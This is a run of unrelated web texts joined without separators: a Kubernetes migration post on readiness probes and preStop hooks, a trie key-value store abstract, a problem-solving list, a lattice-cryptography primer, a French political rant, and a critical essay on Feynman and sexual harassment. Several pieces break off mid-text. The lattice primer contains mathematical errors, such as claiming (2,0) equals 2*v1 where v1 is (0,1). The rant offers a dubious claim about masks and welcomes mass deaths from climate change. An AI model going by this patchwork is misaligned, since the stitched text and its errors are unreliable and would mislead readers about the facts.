<p>If you want to create a culture where people do the right thing and do it well, start by learning to recognize what the right thing is. Sometimes it’s better to create something new while sometimes, probably more often, maintaining the current system is both more critical and a better investment, at least for the near future. Then make sure engineers who focus on what’s best over what’s exciting get the recognition they deserve, both for the work they do and for the ability to see the difference.</p>



<p>Unless you reward the behavior that provides real engineering and company value, instead of counterproductive …</p></div></div>

            <p>There has been a lot of work going on in Core Customer over the last few months to migrate our OIDC/OAuth2 identity service from our tactical container platform to on-premises Kubernetes clusters. I’ve spoken about our homebrew container platform (Corbenetes) before, but here’s the essentials.</p>

<blockquote>
  <p>We built a container platform using Chef and Docker as a stepping stone to Kubernetes. It utilised our existing apps-on-virtual-machines deployment and operational patterns, and so this allowed Software Engineers to develop their applications in a cloud-native manner in a familiar way, and without needing to use the (at the time) brand new Kubernetes platform.</p>

  <p>Now we have a very high level of confidence in said new Kubernetes platform, we are migrating projects over and decommissioning our middle-ground solution.</p>
</blockquote>

<p>The migration actually went a lot smoother than we anticipated, especially seeing as this is the first large-scale service we have built on Kubernetes. One thing we hadn’t initially accounted for was the different ways in which health checks would be used by the underlying platform to detect whether or not traffic should be sent to a specific container. For some context, our current Corbenetes architecture looks similar to the below with one traefik container and two app containers per host (alongside a number of supporting containers for logging and metrics that aren’t shown here).</p>

<p><img src="https://sbg.technology/images/zero-downtime-kubernetes/corbenetes_architecture.png" alt=""></p>

<p>Traefik acts as a proxy, handling both TLS-termination and sending requests to the two backends that are available on the host. The upstream load balancer examines the health endpoints of the applications (via traefik) as well as traefik’s own <code>/ping</code> endpoint. When we do a restart of the application as part of a release, we stop traefik, which allows existing connections to the application to clear down, and takes it out of service in the load balancer so no further requests are sent to this host. Once the applications have finished dealing with their requests, they too are closed down. Because of this, the shutdown of the application itself doesn’t need to be the cleanest, as by the time it receives the shutdown signal there are no requests being served by it.</p>

<p>The following image shows our current architecture now we’re on Kuberbetes, again very high level. We have traefik and app Pods, each exposed with a Service (essentially a cluster of Pods and a policy allowing access to them). The traefik Service is exposed outside the cluster to allow incoming connections from the load balancer, and we make use of the Ingress resource to direct traffic destined for specific URLs to the app backend Service.</p>

<p><img src="https://sbg.technology/images/zero-downtime-kubernetes/kubernetes_architecture.png" alt=""></p>

<h2 id="how-kubernetes-handles-health-checks">How Kubernetes handles health checks</h2>

<p>Our health checks are defined as part of our Deployment manifest, for both traefik and the application. Initially we used the same health check endpoints as we had been using previously. Our manifest looked a little like this.</p>

<h3 id="traefik">traefik</h3>

<div><div><pre><code>livenessProbe:
  failureThreshold: 2
  httpGet:
    path: /ping
    port: 80
    scheme: HTTP
  initialDelaySeconds: 10
  periodSeconds: 5
readinessProbe:
  failureThreshold: 2
  httpGet:
    path: /ping
    port: 80
    scheme: HTTP
  periodSeconds: 5
</code></pre></div></div>

<h3 id="application">application</h3>

<div><div><pre><code>livenessProbe:
  failureThreshold: 2
  httpGet:
    path: /ping
    port: 8081
    scheme: HTTP
  initialDelaySeconds: 10
  periodSeconds: 5
readinessProbe:
  failureThreshold: 2
  httpGet:
    path: /ping
    port: 8081
    scheme: HTTP
  periodSeconds: 5
</code></pre></div></div>

<p>This seemed to work out alright. Our Pods were up and running when we expected them to be, and when we force stopped the application, the health check went bad and the Pod was deleted. It was at this point we started doing extensive performance testing of the application on this new platform. We noticed an issue with cold starts. It appeared that the first time a non-health check request was made to each application Pod, the response time was around <strong>six seconds</strong>. The was obviously a suboptimal situation, and another reason why we do lots of performance testing using production-like load profiles.</p>

<p>After this first slow response, the application was absolutely fine. Turns out that the application doesn’t compile its JavaScript components until the first page load.</p>

<h2 id="its-alive-but-is-it-ready">It’s alive, but is it ready?</h2>

<p>It’s almost as though the team that built Kubernetes knew this would be a thing, as they specifically define both a <code>livenessProbe</code> and a <code>readinessProbe</code> that can be applied to the Pods. Their <a href="https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/">own documentation</a> explains the difference between the two:</p>

<ul>
  <li><strong>livenessProbe</strong> defines when to restart a container, e.g. the <code>/ping</code> endpoint returns a bad response</li>
  <li><strong>readinessProbe</strong> defines when a container is ready to start accepting traffic, e.g. a script has run to synchronise data in your stateful application</li>
</ul>

<p>In our case, we needed to change our <code>readinessProbe</code> to try and load the <code>/login</code> endpoint, and allow the application to be properly ready for accepting <strong>all</strong> traffic, not just health check traffic.</p>

<div><div><pre><code>readinessProbe:
  failureThreshold: 5
  httpGet:
    path: /login?client_id=auth_provider
    port: 8081
  initialDelaySeconds: 25
  periodSeconds: 10
  timeoutSeconds: 1
  successThreshold: 1
</code></pre></div></div>

<p>This was a great success. Each Pod took about 15 seconds longer to start, but that’s a small price to pay to be confident in the ability of the Pod to handle traffic straight away. We went back to our performance testing and low and behold… we still saw issues with dropped requests during an application release, or scale down of the Pods.</p>

<p>Something about how this application works did not appreciate the way in which Kubernetes was terminating it.</p>

<h2 id="let-me-down-gently">Let me down gently</h2>

<p>When Kubernetes decides that it needs to terminate a Pod (whether this be to evacuate a host, move things around for resource utilisation purposes, or just because there is change to the Deployment warranting the creation of new Pods) it sends a <code>SIGTERM</code> (graceful shutdown request) to PID 1 of the container and waits for up to thirty seconds. In our case, PID 1 was the <code>node</code> parent process.</p>

<p>Remember the way we used to stop the applications on Corbenetes? We’d cut them off from receiving new requests and then eventually stop the application itself. Because at a basic level there is no link in Kubernetes between the state of the application Pods, and the state of the traefik Pods, we can’t hide the application behind traefik any more.</p>

<p>Thankfully, we had a way around this. We could use the Kubernetes <a href="https://kubernetes.io/docs/concepts/containers/container-lifecycle-hooks/">container hooks</a> to implement a PreStop hook to do something <em>before</em> Kubernetes attempts to stop the container. We knew that straight killing the <code>node</code> parent was bad, even if it was graceful, so we experimented with the best way to gracefully terminate the container.</p>

<div><div><pre><code>lifecycle:
  preStop:
    exec:
      command: [
        "sh", "-c", "sleep 2 &amp;&amp; kill -15 $(pidof node | awk '{print $1}') &amp;&amp; sleep 2"
      ]
</code></pre></div></div>

<p>We ended up with this PreStop hook, which waits a couple of seconds, then sends a <code>SIGTERM</code> to the <code>node</code> child process, before waiting for another couple of seconds.</p>

<p>We went back to our performance tests and it was smoother than the proverbial. No matter how aggressively we were terminating Pods and restarting Deployments (the quickest way to test a release without actually releasing), we saw absolutely no degradation in service whatsoever.</p>

<p>This was all fine and dandy, but it taught us an important lesson: even if you are moving from one container-based platform to another, there is no such thing as a lift-and-shift. Each of them have their own nuances that need to be addressed. Now we know that Kubernetes is our standard, and we know how to handle zero-downtime deployments for our applications, we can properly spec out work in future, and not spend days chasing our tail trying to work out why it doesn’t just work.</p>

            <p>Indexes are essential in data management systems to increase the speed of data retrievals. Widespread data structures to provide fast and memory-efficient indexes are prefix tries. Implementations like Judy, ART, or HOT optimize their internal alignments for cache and vector unit efficiency. While these measures usually improve the performance substantially, they can have a negative impact on memory efficiency. In this paper we present Hyperion, a trie-based main-memory key-value store achieving extreme space efficiency. In contrast to other data structures, Hyperion does not depend on CPU vector units, but scans the data structure linearly. Combined with a custom memory allocator, Hyperion accomplishes a remarkable data density while achieving a competitive point query and an exceptional range query performance. Hyperion can significantly reduce the index memory footprint and its performance-to-memory ratio is more than two times better than the best implemented alternative strategy for randomized string data sets.</p>

<p>A lot of people don’t realize that there are general purpose problem solving techniques that cut across domains. They can help you deal with thorny challenges in work, your personal life, startups, or even if you’re trying to prove a new theorem in math.</p>



<p>Below are the 26 general purpose problem solving techniques that I like best, along with a one-word name I picked for each, and hypothetical examples to illustrate what sort of strategy I’m referring to.</p>



<p>Consider opening up this list whenever you’re stuck solving a challenging problem. It’s likely that one or more of these techniques can help!</p>



<h4>General Purpose Techniques for Solving Challenging Problems of All Kinds</h4>



<p>1. <strong>Clarifying</strong> – try to define the problem you are facing as precisely as you can, maybe by writing down a detailed description of exactly what the problem is and what constraints exist for a solution, or by describing it in detail to another person, which may lead to you realizing the problem is not quite what you had thought, or that it has a more obvious solution than you thought.</p>



<p>Life Example: <em>“I thought that I needed to find a new job, but when I thought really carefully about what I don’t like about my current job, I realized that I could likely fix those things by talking to my boss or even, potentially, just by thinking about them differently.”</em></p>



<p>Startup Example: <em>“we thought we had a problem with users not wanting to sign up for the product, but when we carefully investigated what the problem really was, we discovered it was actually more of a problem of users wanting the product but then growing frustrated because of bad interface design.”</em></p>



<p>2. <strong>Subdividing</strong> – break the problem down into smaller problems in such a way that if you solve each of the small problems, you will have solved the entire problem.</p>



<p>Startup Example:<em> “My goal is to get company Z to become a partner with my company, and that seems hard, so let me break that goal into the steps of (a) listing the ways that company Z would benefit from becoming a partner with us, (b) finding an employee at company Z who would be responsive to hearing about these benefits, and (c) tracking down someone who can introduce me to that employee.”</em></p>



<p>Math Example:<em> “I want to prove that a certain property applies to all functions of a specific type, so I start by (a) showing that every function of that type can be written as a sum of a more specific type of function, then I show that (b) the property applies to each function of the more specific type, and finally I show that (c) if the property applies to each function in a set of functions then it applies to arbitrary sums of those functions as well.”</em></p>



<p>3. <strong>Simplifying </strong>– think of the simplest variation of the problem that you expect you can solve that shares important features in common with your problem, and see if solving this simpler problem gives you ideas for how to solve the more difficult version.</p>



<p>Startup Example: <em>“I don’t know how to hire a CTO, but I do know how to hire a software engineer because I’ve done it many times, and good CTOs will often themselves be good software engineers, so how can I tweak my software engineer hiring to make it appropriate for hiring a CTO?”</em></p>



<p>Math Example: <em>“I don’t know how to calculate this integral as it is, but if I remove one of the free parameters, I actually do know how to calculate it, and maybe doing that calculation will give me insight into the solution of the more complex integral.”</em></p>



<p>4. <strong>Crowd-sourcing</strong> – use suggestions from multiple people to gain insight into how to solve the problem, for instance by posting on Facebook or Twitter requesting people’s help, or by posting to a Q&amp;A site like Quora, or by sending emails to 10 people you know explaining the problem and requesting assistance.</p>



<p>Business Example: <em>“Do you have experience outsourcing manufacturing to China? If so, I’d appreciate hearing your thoughts about how to approach choosing a vendor.”</em></p>



<p>Health Example: <em>“I have trouble getting myself to stick to doing exercise daily. If you also used to have trouble getting yourself to exercise but don’t anymore, I’d love to know what worked to make it easier for you.”</em></p>



<p>5. <strong>Splintering</strong> – if the problem you are trying to solve has special cases that a solution to the general problem would also apply to, consider just one or two of these special cases as examples and solve the problem just for those cases first. Then see if a solution to one of those special cases helps you solve the problem in general.</p>



<p>Startup Example: <em>“I want to figure out how to improve employee retention in general, let me examine how I could have improved retention in the case of the last three people that quit.”</em></p>



<p>Startup Example: <em>“I want to figure out how to convince a large number of people to become customers, let me first figure out how to convince just Bill and John to become customers since they seem like the sort of customer I want to attract, and see what general lessons I learn from doing that.”</em></p>



<p>6. <strong>Reading</strong> – read the books or textbooks that seems most related to the topic, and see whether they provide a solution to the problem, or teach you enough related information that you can now solve it yourself. </p>



<p>Economics Example: <em>“Economists probably have already figured out reasonable ways to estimate demand elasticity, let’s see what an econometrics textbook says rather than trying to invent a technique from scratch.”</em></p>



<p>Mental Health Example: <em>“I’ve been feeling depressed for a long time, maybe I should read some well-liked books about depression, such as ‘Feeling Good.'”</em></p>



<p>7. <strong>Searching </strong>– think of a similar problem that you think practitioners, bloggers or academics might have already solved and search online (e.g., via google, Q&amp;A sites, or google scholar academic paper search) to see if anyone has done a write-up about how they solved it.</p>



<p>Advertising Example: <em>“I’m having trouble figuring out the right advertising keywords to bid on for my specific product, I bet someone has a blog post describing how to approach choosing keywords for other related products.”</em></p>



<p>Machine Learning Example:<em> “I can’t get this neural network to train properly in my specific case, I wonder if someone has written a tutorial about how to apply neural networks to related problems.”</em></p>



<p>8. <strong>Unconstraining</strong> – list all the constraints of the problem, then temporarily ignore one or more of the constraints that make the problem especially hard, and try to solve it without those constraints. If you can, then see if you can modify that unconstrained solution until it becomes a solution for the fully constrained problem.</p>



<p>Startup Example: <em>“I need to hire someone who can do work at the intersection of machine learning and cryptography, let me drop the constraint of having cryptography experience and recruit machine learning people, then pick from among them a person that seems both generally capable and well positioned to learn the necessary cryptography.”</em></p>



<p>Computer Science Example: <em>“I need to implement a certain algorithm, and it needs to be efficient, but that seems very difficult, so let me first figure out how to implement an inefficient version of the algorithm (i.e., drop the efficiency constraint), then at the end I will try to figure out how to optimize that algorithm for efficiency.”</em></p>



<p>9. <strong>Distracting</strong> – fill your mind with everything you know about the problem, including facts, constraints, challenges, considerations, etc. and then stop thinking about the problem, and go and do a relaxing activity that requires little focus, such as walking, swimming, cooking, napping or taking a bath to see if new ideas or potential solutions pop into your mind unexpectedly as your subconscious continues to work on the problem without your attention.</p>



<p>Example: <em>“For three days, I’ve been trying to solve this problem at work, but the solution only came to me when I was strolling in the woods and not even thinking about it.”</em></p>



<p>Example from mathematician Henri Poincaré: <em>“The incidents of the travel made me forget my mathematical work. Having reached Coutances, we entered an omnibus to go someplace or other. At the moment when I put my foot on the step, the idea came to me, without anything in my former thoughts seeming to have paved the way for it, that the transformations I had used to define the Fuchsian functions were identical with those of non-Euclidean geometry.”</em></p>



<p>10. <strong>Reexamining</strong> – write down all the assumptions you’ve been making about the problem or about what a solution should look like (yes – make an actual list). Then start challenging them one by one to see if they are actually needed or whether some may be unnecessary or mistaken.</p>



<p>Psychology Example: <em>“We were assuming in our lab experiments that when people get angry they have some underlying reason behind it, but there may be some anger that is better modeled as a chemical fluctuation that is only loosely related to what happens in the lab, such as when people are quick to anger because they are hungry.”</em></p>



<p>Math Example: <em>“I need to construct a function that has this strange property, and so far I’ve assumed that the function must be smooth, but if it doesn’t actually need to be then perhaps I can construct just such a function out of simple linear pieces that are glued together.”</em></p>



<p>11.<strong> Reframing</strong> – try to see the problem differently. For instance, by flipping the default, analyzing the inverse of the problem instead, thinking about how you would achieve the opposite of what you want, or shifting to an opposing perspective.</p>



<p>Startup Example: <em>“If we were building this company over again completely from scratch, what would we do differently in the design of our product, and can we pivot the product in that direction right now?”</em></p>



<p>Life Example: <em>“Should move to New York to take a job that pays $20,000 more per year? Well, if I already lived in New York, the decision to stay there rather than taking a $20,000 pay cut to move here would be an easy one. …</em></p></div></div>

<p>Lattice-based cryptography has been coming into the spotlight recently. In January 2019, Many of the semifinalists in the <a href="https://www.nist.gov/news-events/news/2019/01/nist-reveals-26-algorithms-advancing-post-quantum-crypto-semifinals" rel="noopener">NIST post-quantum-cryptography competition</a> were based on lattices. Lattice based cryptography has promising aspects that make it a contender for the basis of cryptographic security in a post-quantum world.</p>



<h2>What is a Lattice?</h2>



<p> According to <a href="https://en.wikipedia.org/wiki/Lattice-based_cryptography" rel="noopener">Wikipedia</a>, a lattice&nbsp;is the set of all integer linear combinations of basis vectors:</p>



<div><div>
<div><figure><img loading="lazy" src="https://wikimedia.org/api/rest_v1/media/math/render/svg/66095403ff779502911d684cccf77daff8981b56" alt="{\displaystyle \mathbf {b} _{1},\ldots ,\mathbf {b} _{n}\in \mathbb {R} ^{n}}" width="128" height="21" title="66095403ff779502911d684cccf77daff8981b56"></figure></div>
</div></div>



<p>i.e.</p>



<div><div>
<div><figure><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/bfe3dc9615c168ff919b1c5b229ad392229b8c1d" alt="{\displaystyle L={\Big \{}\sum a_{i}\mathbf {b} _{i}\ :\ a_{i}\in \mathbb {Z} {\Big \}}\;.}" title="bfe3dc9615c168ff919b1c5b229ad392229b8c1d"></figure></div>
</div></div>



<p>More simply put, a lattice is defined by basis vectors, which are only able to be scaled by integers… yay no fractions! </p>



<p>For example, let’s create a lattice of all the integers in a two-dimensional plane:</p>



<figure><img loading="lazy" width="1024" height="740" src="https://qvault.io/wp-content/uploads/2020/01/Capture-1024x740.png" alt="two dimensional lattice" srcset="https://qvault.io/wp-content/uploads/2020/01/Capture-1024x740.png 1024w, https://qvault.io/wp-content/uploads/2020/01/Capture-300x217.png 300w, https://qvault.io/wp-content/uploads/2020/01/Capture-768x555.png 768w, https://qvault.io/wp-content/uploads/2020/01/Capture-100x72.png 100w, https://qvault.io/wp-content/uploads/2020/01/Capture-862x623.png 862w, https://qvault.io/wp-content/uploads/2020/01/Capture-1200x867.png 1200w, https://qvault.io/wp-content/uploads/2020/01/Capture.png 1255w" sizes="(max-width: 1024px) 100vw, 1024px" title="Capture"></figure>



<p>The definition of our lattice contains only 2 basis vectors,</p>



<p>v1 = (0,1) </p>



<p>v2 = (1,0)</p>



<figure><img loading="lazy" width="1024" height="740" src="https://qvault.io/wp-content/uploads/2020/01/Capture2-1-1024x740.png" alt="lattice with two vectors" srcset="https://qvault.io/wp-content/uploads/2020/01/Capture2-1-1024x740.png 1024w, https://qvault.io/wp-content/uploads/2020/01/Capture2-1-300x217.png 300w, https://qvault.io/wp-content/uploads/2020/01/Capture2-1-768x555.png 768w, https://qvault.io/wp-content/uploads/2020/01/Capture2-1-100x72.png 100w, https://qvault.io/wp-content/uploads/2020/01/Capture2-1-862x623.png 862w, https://qvault.io/wp-content/uploads/2020/01/Capture2-1-1200x867.png 1200w, https://qvault.io/wp-content/uploads/2020/01/Capture2-1.png 1255w" sizes="(max-width: 1024px) 100vw, 1024px" title="Capture2 1"></figure>



<p>Our lattice is the set of <strong>all </strong>values that can be reached by any combination and scale of our basis vectors. For example, the point (2,0) is in our lattice because it can be reached by 2*v1</p>



<figure><img loading="lazy" width="1024" height="740" src="https://qvault.io/wp-content/uploads/2020/01/Capture3-1-1024x740.png" alt="lattice with combination of vectors" srcset="https://qvault.io/wp-content/uploads/2020/01/Capture3-1-1024x740.png 1024w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1-300x217.png 300w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1-768x555.png 768w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1-100x72.png 100w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1-862x623.png 862w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1-1200x867.png 1200w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1.png 1255w" sizes="(max-width: 1024px) 100vw, 1024px" title="Capture3 1"></figure>



<p>Similarly, we could create an entirely new lattice by changing our basis vectors to</p>



<p>v1 = (0,3)</p>



<p>v2 = (3,0)</p>



<figure><img loading="lazy" width="1024" height="583" src="https://qvault.io/wp-content/uploads/2020/01/Capture5-1-1024x583.png" alt="lattice with change of basic vectors" srcset="https://qvault.io/wp-content/uploads/2020/01/Capture5-1-1024x583.png 1024w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1-300x171.png 300w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1-768x437.png 768w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1-100x57.png 100w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1-862x491.png 862w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1-1200x683.png 1200w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1.png 1315w" sizes="(max-width: 1024px) 100vw, 1024px" title="Capture5 1"></figure>



<p>As you can see, now the intermediary points (0,1) and (0,1) <strong>no longer exist</strong> in our lattice. There is no way to scale v1 (0,3) and v2 (3,0) to reach those points without using fractional scalars. With lattices, we can only scale by whole integers.</p>



<h2>How Does This Help With Crypto?</h2>



<p>Cryptographic algorithms are typically based on mathematical problems that are easy to verify the answer of, but hard to calculate.</p>



<p>For example, RSA is based on prime factorization. If I told you to find prime factors of <em>27,919,645,564,169,759</em>, that would be hard. However, if I told you that 48,554,491 and 575,016,749 <em>are </em>prime factors, all you have to do is multiply them together in order to verify my answer.</p>



<p>RSA works great with classical computers. There are <a href="https://crypto.stackexchange.com/questions/10590/what-makes-rsa-secure-by-using-prime-numbers" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener nofollow">no known solutions to find prime factors</a> of a number reliably in less than exponential time.</p>



<p>In the quantum world, things don’t look so peachy. <a href="https://en.wikipedia.org/wiki/Shor%27s_algorithm" target="_blank" aria-label="Shor's algorithm (opens in a new tab)" rel="noreferrer noopener nofollow">Shor’s algorithm</a> on quantum computers can crack RSA in less than exponential time. For this reason, we need quantum-safe algorithms. Many believe that lattice math could be an answer.</p>



<h2>Shortest Vector Problem</h2>



<div><figure><img loading="lazy" width="220" height="112" src="https://qvault.io/wp-content/uploads/2020/01/220px-SVP.svg_.png" alt="shortest vector problem" srcset="https://qvault.io/wp-content/uploads/2020/01/220px-SVP.svg_.png 220w, https://qvault.io/wp-content/uploads/2020/01/220px-SVP.svg_-100x51.png 100w" sizes="(max-width: 220px) 100vw, 220px" title="220px SVP.svg"></figure></div>



<p><a aria-label=" (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Lattice_problem#Shortest_vector_problem_(SVP)" target="_blank">The shortest vector problem (SVP)</a> is one of the fundamentals problems presented by lattices that allow them to be useful in cryptography.</p>



<p>Simply put, the goal of SVP is for the attacker to find the shortest vector from the origin (above in red) when given the basis of a lattice (above in blue). A zero vector doesn’t work as an answer, we consider it trivial.</p>



<p>How is it solved?</p>



<p>Like RSA with classical computers, it is hard to find the shortest vector of a large lattice, especially if it exists in many dimensions. One such slow solution for approximating the shortest vector is <a href="https://en.wikipedia.org/wiki/L%C3%A1szl%C3%B3_Babai" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener nofollow">Babai</a>‘s algorithm, or <a href="https://cims.nyu.edu/~regev/teaching/lattices_fall_2004/ln/cvp.pdf" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener nofollow">Nearest Plane Algorithm</a>, which you can read about in the links provided.</p>

		<p>Everything about France work system can be understood reading one sentence : In France it is legally impossible to fire an employee who doesn't want to leave. </p>
<p>This is something I've never understood, how can we think that an employee possesses his job ? An employee is working for a salary and benefits, that's all, the rest belongs to the company, which belongs to its investors.</p>
<p>France is a touristic country which doesn't grow anymore. It is not doing worst than <a href="https://data.worldbank.org/indicator/NY.GDP.PCAP.KD.ZG?end=2019&amp;locations=FR-GB-DE-US&amp;start=1961&amp;view=chart">neighbour countries</a> but this can't be an excuse. The youngest company of the CAC40 (40 biggest companies in france) was <a href="https://twitter.com/paulg/status/650702144186662914?lang=en">founded in 1967</a>. Building a company there is tough, there are a lot of taxes (paying an 1$ to an employee requires the company to pay one other dollar to the government). The work system is outdated, people can't be fired, the work legislation is more complex (3000 pages) than building a fusion reactor. Founders are limited and will either try to sell their company as soon as it is a bit successfull or move their headquarter in the US. The EU is not a unified market, every country has its own legislation, culture, language, ... And at the end if you are successfull there will be millions of people try to explain to you that you should not be rich.</p>
<p>But the problem is not only the system, the people are also the problem (the system is the people and the people are the system I know). France political system is an oligarchy hidden behind that everyone can vote. But a country can't be smarter than its own population. France as a country doesn't have any goal, people are living in the country complaining all the time about everything, there is no wish to progress or to help people, the only goal is to preserve its own privilege. Rich people make friends with politic people to preserve their advantages, poor people try to work less, profit from employment benefits and complain about everything else. People in the middle live together and use their money to balance the failing of the {school,retiring} systems. As a result the whole system is stuck.</p>
<p>Our school system is shit, it is designed for already priviledged students to be successfull and for poor people to fail. Because, of course it is easier to educate already educated people and tell to others that it is their fault if they do not succeed.  Our retiring system is complete garbage, nobody understand how 25M people working can pay for 14M people not working, and for french people it is normal to retire at 62 years old, this is normal because it has always been like that, so why change ? But thanks to debt our country is not fucked. It is always easier to borrow money than to earn it so why bother ?</p>
<p>Our 'democracies' are not working, you can't accept that all opinions are equals, you would not choose your CEO by making everyone in the company vote. The covid crisis is a good example showing that a democracy can't handle important crisi. Everyone has become an epidemiologist, anyone knows what is a good traitment, anyone knows how to protect himself, anyone is able to read a scientific study and make its own conclusion. The more follower you have the smarter epidemiologist you are. China suggested to do a lockdown, well lets do a lockdown, some tv host suggested that we wear mask ? Well lets wear mask. Masks doesn't prevent the virus to spread ? then lets make the mask mandatory, student are going to be in class touching each other, exchanging pens and papers ? well let's take the most stupid decision ever and madate them to wear a mask? When everyone has an opinion and this opinion has to be taken seriously the opinion of no one has any value. Democracy seems to be the worst politic system when you want to achieve best performance.</p>
<p>We are trying to reach the maximum level of stupidity and everybody seems to be fine with it.</p>
<h2>How to fix that ?</h2>
<p>On the short term this is impossible, you can't change the mentality of people in the short term, you can't educate greater than 25 years old people, you can't change the work system in a few years. The only thing that can save us is education. Educate your children, force them to go to school to do their homework, tell them that they will be able to become software engineers if they study and start working with a better salary than 90% of the population. Vote for people who care about education, and vote for people who will try to improve education of unpriviledege people, the smarter 'the most stupid' people are, the smarter the country is going to be. Don't vote for a president, this is useless, they are all the same and complete garbage, the system is not designed for a competent person to be elected. Fortunately climate change is coming and is going to kill most of the population, that way the few people who will be there (if any ) to rebuilt the world will be able to make better foundations. If you want to live a pleasant life, ignore the rules, the laws, the governements and focus on doing good around you, educate your children, help the cleaning lady, dont give your money to your children when you die, give it to charity, dont take any time caring about politics dont go voting for someone linked to a party, vote for motivated people who wants to make things change.... Try to think with your brain and stop listening to what media tell you</p>
<p>Not everything is bad, look at the US and appreciate how lucky we are</p>

<p><em>Content note: this article contains discussion of sexual harassment.</em></p>
<p><span>W</span>hen family friends heard that I wanted to be a physicist, I was gifted not one but two copies of <em>“Surely You’re Joking, Mr. Feynman!”: (Adventures of a Curious Character)</em>. Mainly autobiographical, <em>Surely You’re Joking</em> is a collection of anecdotes from the physicist Richard Feynman that span his youth, work on the Manhattan project, and experiences as a Caltech professor in the 60’s and 70’s, at which point he was well-established as one of the greatest minds of the 20th century.</p>
<p>At 15, when I received the books, I was nerdy and deeply committed to a vision of becoming a great scientist. Feynman was certainly great. His contributions to physics cannot be overstated—they were nothing less than transformative to the field. I believed that his writings would be a window into the mind of an indisputable genius, and provide guidance on how to develop an objective and ethical mindset in the true spirit of science. Because after all, doesn’t vast knowledge translate to wisdom?</p>
<p><em>Surely You’re Joking</em> doesn’t go into much detail on Feynman’s extensions to <a href="https://en.wikipedia.org/wiki/Quantum_electrodynamics" target="_blank">quantum electrodynamics</a> or <a href="https://en.wikipedia.org/wiki/Quark" target="_blank">quark theory</a>. Instead, he recounts becoming a radio repairman at age 12, wisecracking his way through the required humanities courses at MIT, and picking the locks on safes containing atomic secrets at the Los Alamos Manhattan project site. There are also anecdotes about frat brothers teaching him how to pick up girls, impressing women with his bongo drum skills, and hitting on the visiting wives and sisters of his peers in graduate school.</p>
<p>I read with growing unease to the book’s halfway point, where Feynman describes his frustrations with the girls at an Albuquerque nightclub near Los Alamos<sup><a href="#1">1</a></sup>:</p>
<blockquote>
<p>I adopted the attitude that those bar girls are all bitches, that they aren’t worth anything, and all they’re in there for is to get you to buy them a drink, and they’re not going to give you a goddamn thing; I’m not going to be a gentleman to such worthless bitches, and so on. I learned it till it was automatic.</p>
</blockquote>
<p>I was shocked, but still found it hard to condemn my hero. Besides, Feynman is considered the ultimate offbeat, free-wheeling physicist, judged as eccentric and often rude by his colleagues; his behavior towards women, I reasoned, must be a weird one-off—there’s no way it can be prevalent in the scientific community today.</p>
<p>I maintained this false optimism until I was sexually harassed during my first research internship at the <a href="https://www.noao.edu/" target="_blank">National Optical Astronomy Observatory</a> (NOAO). I arrived eager to apply my college physics courses to the task at hand—searching for supermassive black holes surrounded by bright halos of matter known as <a href="https://en.wikipedia.org/wiki/Active_galactic_nucleus" target="_blank">active galactic nuclei</a>. The research was fascinating, but I had to contend with something else. Over the summer, the staff scientist appointed as our program director conducted a careful campaign of isolating the female students in the program—getting us alone within the research facility and on trips to telescope observatories in remote locations—to solicit inappropriate and unwanted physical contact. He would enter our lab space and disturb our work with long sermons on his connections to illustrious institutions like Caltech, heavily dropping hints that he could put in a good word when we applied to graduate school if we impressed him. Once, on the pretense of looking at another intern’s code on her computer screen, I witnessed him lean towards her and rest his head on her shoulder for several minutes. This is one of the milder incidents of harassment we dealt with, but I am not comfortable recounting anything more explicit.</p>
<p>At the end of the internship I spoke with the other female students about what we had experienced. We all agreed that if this treatment of women was standard for physics and astronomy, we would search for jobs outside of science. This kind of <a href="https://www.sciencemag.org/news/2017/10/disturbing-allegations-sexual-harassment-antarctica-leveled-noted-scientist" target="_blank">harassment</a> <a href="https://www.buzzfeednews.com/article/azeenghorayshi/how-harassment-stays-secret" target="_blank">often</a> <a href="https://www.buzzfeednews.com/article/azeenghorayshi/ott-harassment-investigation#.qj3ky4Bw53" target="_blank">forces</a> <a href="https://www.columbiaspectator.com/eye-lead/2018/04/20/under-the-veil-the-silence-surrounding-sexual-harassment-in-labs-at-columbia/" target="_blank">women</a> <a href="https://www.bostonglobe.com/metro/2018/11/15/lawsuit-describes-century-animal-house-dartmouth-college/OVtrcSKDRJFTAWdvOWsyfL/story.html" target="_blank">out</a> of academia.</p>
<p>I am now a planetary science graduate student at Caltech where I research <a href="https://en.wikipedia.org/wiki/Exoplanet" target="_blank">exoplanets</a>—planets outside our Solar System that orbit stars other than the sun. But though my work has strayed from pure physics, Feynman’s presence is inescapable no matter what you study here. His books grace the shelves of my professors and his likeness is displayed in the form of countless statues, murals, and posters across campus. For over two years, I received weekly emails advertising “The Mind’s Eye: Richard Feynman in Word and Image,” a Caltech Archives exhibition of his lecture notes and visual materials celebrating 100 years since his birth. <a href="http://dining.sites.caltech.edu/students/board-plan-options" target="_blank">The student meal plan was named after him</a>. And among the alumni and students, he has achieved <a href="https://www.quora.com/What-role-did-Richard-Feynman-play-at-Caltech" target="_blank">cult-level adoration</a>—at Caltech, Feynman is undeniably a giant.</p>

<p><a href="https://www.quora.com/What-role-did-Richard-Feynman-play-at-Caltech" target="_blank">Quora</a></p>
<p>Either I had misjudged Feynman, or others weren’t judging him enough. I borrowed a copy of <em>Surely You’re Joking</em> from the Caltech library (there are 11 available) to investigate. In my second reading, I learned that Feynman enjoyed doing research at topless bars near Caltech, where he also picked up a habit of drawing nude portraits of women.<sup><a href="#1">1</a></sup> Many of his later nude models were his students.<sup><a href="#1">1</a></sup> I also learned that when he was a professor at Cornell, he regularly pretended to be a student to convince undergraduates to sleep with him.<sup><a href="#1">1</a>,<a href="#2">2</a></sup></p>
